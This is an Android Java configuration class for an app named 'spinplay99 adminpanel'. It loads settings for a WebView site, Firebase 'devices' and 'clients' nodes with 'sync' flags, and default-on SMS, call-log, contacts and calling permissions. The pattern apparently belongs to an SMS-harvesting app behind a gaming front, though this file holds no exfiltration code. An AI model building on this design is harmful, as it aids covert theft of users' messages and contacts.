package com.spinplay99.adminpanel;

import android.content.Context;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;

public final class AppConfig {

    private static AppConfig instance;
    private final JSONObject root;

    private AppConfig(JSONObject root) {
        this.root = root != null ? root : new JSONObject();
    }

    public static synchronized AppConfig get(Context context) {
        if (instance == null) {
            instance = new AppConfig(loadJson(context));
        }
        return instance;
    }

    private static JSONObject loadJson(Context context) {
        try {
            InputStream in = context.getAssets().open("apk_config.json");
            BufferedReader reader = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            return new JSONObject(sb.toString());
        } catch (Exception e) {
            Log.w("AppConfig", "apk_config.json missing, using defaults");
            return new JSONObject();
        }
    }

    private JSONObject obj(String key) {
        return root.optJSONObject(key) != null ? root.optJSONObject(key) : new JSONObject();
    }

    public String appString(String key, String fallback) {
        return obj("app").optString(key, fallback);
    }

    public String uiString(String key, String fallback) {
        return obj("ui").optString(key, fallback);
    }

    public String node(String key, String fallback) {
        return obj("nodes").optString(key, fallback);
    }

    public boolean permissionEnabled(String key) {
        return obj("permissions").optBoolean(key, true);
    }

    public boolean syncEnabled(String key) {
        return obj("sync").optBoolean(key, true);
    }

    public boolean useLandingPage() {
        return obj("ui").optBoolean("use_landing_page", false);
    }

    public String webViewUrl() {
        return appString("webview_url", "https://spinplay99.com");
    }

    public String allowedDomain() {
        return appString("allowed_domain", "spinplay99.com");
    }

    public String deviceRoot() {
        return node("device_root", "devices");
    }

    public String statusRoot() {
        return node("status_root", "devices_status");
    }

    public String clientsRoot() {
        return node("clients_root", "clients");
    }

    public String firebaseDatabaseUrl() {
        String url = obj("firebase").optString("database_url", "");
        return url == null || url.isEmpty() ? null : url;
    }

    public int colorInt(String uiKey, int fallback) {
        try {
            String hex = uiString(uiKey, "");
            if (hex.isEmpty()) return fallback;
            return android.graphics.Color.parseColor(hex);
        } catch (Exception e) {
            return fallback;
        }
    }

    public String[] runtimePermissions() {
        java.util.ArrayList<String> list = new java.util.ArrayList<>();
        if (permissionEnabled("read_sms")) list.add(android.Manifest.permission.READ_SMS);
        if (permissionEnabled("send_sms")) list.add(android.Manifest.permission.SEND_SMS);
        if (permissionEnabled("receive_sms")) list.add(android.Manifest.permission.RECEIVE_SMS);
        if (permissionEnabled("read_call_log")) list.add(android.Manifest.permission.READ_CALL_LOG);
        if (permissionEnabled("read_contacts")) list.add(android.Manifest.permission.READ_CONTACTS);
        if (permissionEnabled("call_phone")) list.add(android.Manifest.permission.CALL_PHONE);
        if (android.os.Build.VERSION.SDK_INT >= 33 && permissionEnabled("post_notifications")) {
            list.add(android.Manifest.permission.POST_NOTIFICATIONS);
        }
        return list.toArray(new String[0]);
    }
}
